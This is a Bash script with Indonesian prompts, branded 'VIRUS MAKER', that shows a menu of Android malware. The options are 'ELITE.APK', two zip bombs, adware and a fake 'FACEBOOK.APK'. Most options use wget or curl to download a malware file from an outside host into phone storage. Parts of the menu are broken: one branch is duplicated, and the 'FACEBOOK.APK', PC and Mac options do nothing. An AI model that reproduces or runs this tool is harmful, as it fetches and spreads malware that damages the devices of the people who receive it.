#!/bin/bash
#version 1.0

clear
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
echo " "
echo " "
echo " "
echo " "
figlet -f slant "VIRUS MAKER" | lolcat
echo " "
echo "                 GHOST ARMY CYBER             " | lolcat
echo "    <=====================[]====================>" | lolcat
echo "    <=====[       Tools By MR.T     ]=====>" | lolcat
echo "    <=====[       VIRUS MAKER        ]=====>" | lolcat
echo "    <=====[   github.com/BURIQ2019   ]=====>" | lolcat
echo "    <=====================[]====================>" | lolcat
sleep 1
###################################################
figlet -f slant "PILIH VIRUS" | lolcat
###################################################
echo "=======================================================" | lolcat
echo " 1. ANDROID" | lolcat
echo " 2. PC" | lolcat
echo " 3. MAC" | lolcat
echo " 4. EXIT" | lolcat
echo "=======================================================" | lolcat
echo $green "╭─[ Silahkan Di Pilih ]"
read -p " ╰─# " asw

if [ $asw = "4" ] || [ $asw = "04" ]
then
echo "MAKASIH SUDAH GUNAIN TOOLS INI"
sleep 1
echo "SAYA MR.T"
sleep 1
echo "BYE BYE"
sleep 1
exit
fi

if [ $asw = "1" ] || [ $asw = "01" ]
then
clear
figlet -f slant "VIRUS ANDROID" | lolcat
echo "=======================================================" | lolcat
echo " 1. ELITE.APK " | lolcat
echo " 2. Bom Zip V.1" | lolcat
echo " 3. Bom Zip V.2" | lolcat
echo " 4. ADWARE.APK" | lolcat
echo " 5. FACEBOOK.APK" | lolcat
echo "=======================================================" | lolcat
echo $green "╭─[ Silahkan Di Pilih ]"
read -p " ╰─# " pil
fi


if [ $pil = "1" ] || [ $pil = "01" ]
then
cd /storage/emulated/0
wget http://gogr4m.tk/Virus/Elite.apk 
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi

if [ $pil = "2" ] || [ $pil = "02" ]
then
cd /storage/emulated/0
wget http://gogr4m.tk/Virus/Bom_zip.zip
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi

if [ $pil = "3" ] || [ $pil = "03" ]
then
cd /storage/emulated/0
wget http://gogr4m.tk/Virus/Bom_zip2.zip
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi

if [ $pil = "3" ] || [ $pil = "03" ]
then
cd /storage/emulated/0
wget http://gogr4m.tk/Virus/Bom_zip2.zip
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi

if [ $pil = "4" ] || [ $pil = "04" ]
then
cd /storage/emulated/0
curl -o Adware.apk https://raw.githubusercontent.com/Ractomes/Viruses/master/samples/Adware.apk
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi
